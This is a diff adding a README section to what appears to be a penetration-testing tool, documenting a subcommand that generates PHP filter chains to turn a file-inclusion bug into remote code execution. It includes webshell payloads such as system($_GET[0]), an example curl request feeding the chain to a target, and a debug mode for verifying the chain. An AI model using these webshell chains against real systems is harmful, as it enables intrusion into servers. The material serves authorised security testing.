@@ -164,6 +164,45 @@ The JSON schema is versioned (`schema_version: "1"`). Top-level fields:
 Each hit includes `entry_id`, `path`, `technique`, `status_code`, `elapsed_ms`,
 `snippets`, `findings`, `chain` (bool), and `chain_depth`.
 
+### PHP filter chains (RCE escalation)
+
+A confirmed file-read is often only a step away from remote code execution.
+When the target `include()`/`require()`s a parameter you control, the
+**PHP filter chain** technique (loknop's research, popularised by synacktiv)
+turns that read primitive into *arbitrary content*: chained `convert.iconv`
+filters reconstruct a payload of your choosing — typically a PHP webshell — from
+a resource whose original contents don't matter, and the `include()` sink then
+executes it.
+
+`exhumed payload php-filter` is a payload **generator**: it prints the
+`php://filter/...` string and performs no network I/O. You place the string into
+the vulnerable parameter yourself.
+
+```bash
+# Generate a chain that runs system($_GET[0]) on the target
+exhumed payload php-filter --rce '<?php system($_GET[0]);?>'
+
+# Short-tag webshell, custom sink resource (default is php://temp)
+exhumed payload php-filter --rce '<?=`$_GET[0]`?>' --resource php://temp
+
+# Then feed the printed chain to the vulnerable parameter, e.g.:
+#   curl 'http://target.local/?file=php://filter/...&0=id'
+```
+
+The generated chain is **byte-for-byte identical** to synacktiv's reference
+`php_filter_chain_generator` for the same payload (pinned by a golden test), and
+the construction is pure-Go string assembly — no GPL dependencies, no PHP runtime
+required to generate.
+
+Debug / verification mode: pass a pre-encoded base64 payload with `--raw-base64`
+and `--debug` to emit a chain that surfaces the *reconstructed base64* (omitting
+the final decode) so you can confirm the chain rebuilds your bytes correctly on
+the target before arming it:
+
+```bash
+exhumed payload php-filter --raw-base64 PD9waHAgcGhwaW5mbygpOz8+ --debug
+```
+
 ### Other commands
 
 ```bash
